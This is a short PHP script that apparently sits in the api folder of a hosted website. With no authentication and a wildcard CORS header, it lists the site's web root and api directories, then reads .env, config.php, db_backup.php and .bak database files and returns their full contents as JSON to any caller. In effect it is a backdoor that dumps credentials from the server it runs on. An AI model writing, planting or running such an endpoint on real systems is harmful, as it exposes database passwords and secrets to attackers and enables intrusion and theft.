<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

$dir = dirname(dirname(__FILE__)); // /home/pnxyadoh/public_html
$files = [];
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file != '.' && $file != '..') {
                $files[] = $file;
            }
        }
        closedir($dh);
    }
}

$api_dir = dirname(__FILE__); // /home/pnxyadoh/public_html/api
$api_files = [];
if (is_dir($api_dir)) {
    if ($dh = opendir($api_dir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file != '.' && $file != '..') {
                $api_files[] = $file;
            }
        }
        closedir($dh);
    }
}

$config_content = "";
// Let's check common files in /home/pnxyadoh/public_html/
$possible_files = [
    $dir . "/.env",
    $dir . "/db_backup.php",
    $dir . "/config.php",
    $dir . "/db.php.bak",
    $api_dir . "/.env",
    $api_dir . "/db.php.bak",
];

foreach ($possible_files as $f) {
    if (file_exists($f)) {
        $config_content .= "--- File: $f ---\n" . file_get_contents($f) . "\n\n";
    }
}

echo json_encode([
    "success" => true,
    "root_dir" => $dir,
    "api_dir" => $api_dir,
    "root_files" => $files,
    "api_files" => $api_files,
    "config" => $config_content
]);
?>
